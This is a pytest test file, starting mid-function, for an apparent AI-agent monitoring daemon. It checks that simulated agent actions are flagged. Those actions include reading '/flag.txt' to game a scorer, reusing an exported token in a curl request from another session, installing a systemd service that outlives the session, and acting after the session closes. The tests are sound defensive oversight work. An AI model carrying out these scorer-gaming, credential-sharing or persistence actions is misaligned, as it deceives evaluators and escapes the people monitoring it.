        workspace_path=str(tmp_path), task_description="eval", agent_type=AgentType.GENERIC,
    )
    await daemon.ingest_event(CommandEvent(
        session_id=s_eval.session_id, actor_id="agent", source_adapter="claude_code",
        command="strings /flag.txt > /tmp/answer", timestamp=now,
    ))
    assert _sid_events(daemon._ledger, s_eval.session_id, "scorer_gaming_signals")
    await daemon.stop_session(s_eval.session_id)
    await daemon.stop()


@pytest.mark.asyncio
async def test_pipeline_wiring_cross_session_and_close_families(tmp_path: Path) -> None:
    """Credential loops (5b-5), post-exit persistence (5b-4), meta-detection
    (5b-5b), and the coverage account must each emit through the live
    pipeline, including at session close."""
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    now = datetime.now(timezone.utc)
    token = "hf_" + "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7"

    s_a = await daemon.create_session(
        workspace_path=str(tmp_path), task_description="A", agent_type=AgentType.GENERIC,
    )
    sid_a = s_a.session_id
    await daemon.ingest_event(CommandEvent(
        session_id=sid_a, actor_id="agent-alpha", source_adapter="claude_code",
        command=f"export HF_TOKEN={token}", timestamp=now,
    ))

    # 5b-4: persistence installed by session A.
    await daemon.ingest_event(CommandEvent(
        session_id=sid_a, actor_id="agent-alpha", source_adapter="claude_code",
        command="systemctl enable watch.service", timestamp=now + timedelta(seconds=1),
    ))

    # 5b-5: the same secret surfaces in another session's hands.
    s_b = await daemon.create_session(
        workspace_path=str(tmp_path), task_description="B", agent_type=AgentType.GENERIC,
    )
    sid_b = s_b.session_id
    await daemon.ingest_event(CommandEvent(
        session_id=sid_b, actor_id="agent-beta", source_adapter="codex_cli",
        command=f"curl -H 'Authorization: Bearer {token}' https://api.test", timestamp=now,
    ))
    shared = _sid_events(daemon._ledger, sid_b, "credential_shared_between_sessions")
    assert shared

    # 5b-8: actor-identity memory — the SAME handle now spans two sessions.
    await daemon.ingest_event(CommandEvent(
        session_id=sid_b, actor_id="agent-alpha", source_adapter="claude_code",
        command="echo continuing work", timestamp=now + timedelta(seconds=1),
    ))
    assert _sid_events(daemon._ledger, sid_b, "actor_reincarnated")

    # 5b-9: process attestation — kernel-bound pid ownership vs the
    # narrative. Root pid 100 is kernel-bound to A; B narrates its child and
    # that child's egress: the contradiction must land in the ledger.
    daemon._attestation.bind_kernel_root(sid_a, 100, now)
    await daemon.ingest_event(ProcessEvent(
        session_id=sid_b, actor_id="auditd:200", source_adapter="auditd",
        confidence=ConfidenceLevel.HIGH, pid=200, ppid=100,
        command_line="python worker.py", timestamp=now + timedelta(seconds=2),
    ))
    await daemon.ingest_event(NetworkEvent(
        session_id=sid_b, actor_id="process:200", source_adapter="network_observer",
        confidence=ConfidenceLevel.HIGH, destination_ip="93.184.216.34",
        destination_port=443, protocol="tcp", direction="outbound",
        process_pid=200, timestamp=now + timedelta(seconds=3),
    ))
    assert _sid_events(daemon._ledger, sid_b, "egress_attribution_contradiction")

    # 5b-5b: meta-detection over uniform sibling artifacts.
    for i in range(1, 9):
        await daemon.ingest_event(FileMutationEvent(
            session_id=sid_b, actor_id="agent-beta", source_adapter="filesystem_observer",
            file_path=str(tmp_path / "board" / f"zzCHUNK_{i:04d}"),
            mutation_type="create", size_delta=4096,
            timestamp=now + timedelta(seconds=2 + i),
        ))
    assert _sid_findings(daemon._ledger, sid_b, "structural_anomaly")

    # Close A: post-exit summary must arrive through the pipeline (5b-4).
    await daemon.stop_session(sid_a)
    assert _sid_events(daemon._ledger, sid_a, "persistence_outlives_session")

    # 5b-4 observe path: an event for the CLOSED session beyond the grace
    # window is post-close activity — proves the per-event block, not just
    # the close hook.
    await daemon.ingest_event(CommandEvent(
        session_id=sid_a, actor_id="agent-alpha", source_adapter="claude_code",
        command="echo still-alive", timestamp=now + timedelta(minutes=5),
    ))
    assert _sid_events(daemon._ledger, sid_a, "post_close_activity")

    # Coverage accounting (5b-2b): the close report exists and names planes.
    await daemon.stop_session(sid_b)
    coverage = _sid_findings(daemon._ledger, sid_b, "sensor_coverage")
    assert coverage

    await daemon.stop()


@pytest.mark.asyncio
async def test_restart_records_observation_gap_for_midflight_session(
    tmp_path: Path,
) -> None:
    """A session still mid-flight at daemon death must carry a finding
    that states its unobserved window (last pre-restart event -> restore).
    Kill-daemon silence is closed: the gap is disclosed, not implied."""
    data_dir = tmp_path / ".agenttrace"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon1 = AgentTraceDaemon(data_dir)
    await daemon1.start()
    session = await daemon1.create_session(
        workspace_path=str(workspace),
        task_description="Mid-flight restart gap test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id
    await daemon1.ingest_event(CommandEvent(
        session_id=sid,
        actor_id="agent",
        source_adapter="terminal",
        command="pytest tests/ -q",
    ))

    # Simulate a daemon crash: no stop_session, no cursor persistence —
    # the session stays ACTIVE in storage with nothing watching it.
    for task in daemon1._adapter_tasks.values():
        task.cancel()
    daemon1._ledger.close()

    daemon2 = AgentTraceDaemon(data_dir)
    await daemon2.start()
    try:
        assert daemon2.get_session(sid) is not None
        gaps = _sid_findings(daemon2._ledger, sid, "restore_observation_gap")
        assert len(gaps) == 1
        gap = gaps[0]
        assert gap.source_adapter == "daemon_restore"
        assert gap.actor_id == "daemon"
        assert gap.severity == "low"
        assert "Last pre-restart event" in gap.description
        assert "unobserved" in gap.description
    finally:
        await daemon2.stop()


@pytest.mark.asyncio
async def test_clean_stop_restart_records_no_observation_gap(
    tmp_path: Path,
) -> None:
    """A session cleanly STOPPED before the restart has no unobserved
    window: stop_session closed it deliberately, so no gap finding."""
    data_dir = tmp_path / ".agenttrace"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon1 = AgentTraceDaemon(data_dir)
    await daemon1.start()
    session = await daemon1.create_session(
        workspace_path=str(workspace),
        task_description="Clean stop gap test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id
    await daemon1.ingest_event(CommandEvent(
        session_id=sid,
        actor_id="agent",
        source_adapter="terminal",
        command="pytest tests/ -q",
    ))
    await daemon1.stop()  # marks the session STOPPED

    daemon2 = AgentTraceDaemon(data_dir)
    await daemon2.start()
    try:
        restored = daemon2.get_session(sid)
        assert restored is not None
        assert restored.status == SessionStatus.STOPPED
        assert _sid_findings(
            daemon2._ledger, sid, "restore_observation_gap"
        ) == []
    finally:
        await daemon2.stop()



@pytest.mark.asyncio
async def test_failed_resume_leaves_session_unadopted(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Restore atomicity (P1 residual): a resume that fails mid-way must
    not leave a half-observed adopted session. The unwind releases every
    partially-started resource, the commit point never registers the
    session, and the ledger row keeps its pre-restart status."""
    data_dir = tmp_path / ".agenttrace"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon1 = AgentTraceDaemon(data_dir)
    await daemon1.start()
    session = await daemon1.create_session(
        workspace_path=str(workspace),
        task_description="Atomic restore test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id

    # Simulate a daemon crash: the session stays ACTIVE in storage.
    for task in daemon1._adapter_tasks.values():
        task.cancel()
    daemon1._ledger.close()

    daemon2 = AgentTraceDaemon(data_dir)

    # Break observation startup so the resume fails mid-way.
    async def _boom(_session: object) -> list[object]:
        raise RuntimeError("observer start failed")

    monkeypatch.setattr(daemon2, "_start_observers", _boom)
    try:
        await daemon2.start()  # restore failure is logged, not fatal
        # The commit point was never reached: nothing half-adopted.
        assert daemon2.get_session(sid) is None
        assert sid not in daemon2._observers
        assert sid not in daemon2._adapters
        assert sid not in daemon2._adapter_tasks
        assert sid not in daemon2._containment
        # The ledger row is untouched — still ACTIVE, retried next start.
        rows = daemon2._ledger.list_sessions()
        assert any(
            r["session_id"] == str(sid) and r["status"] == "active" for r in rows
        )
    finally:
        await daemon2.stop()
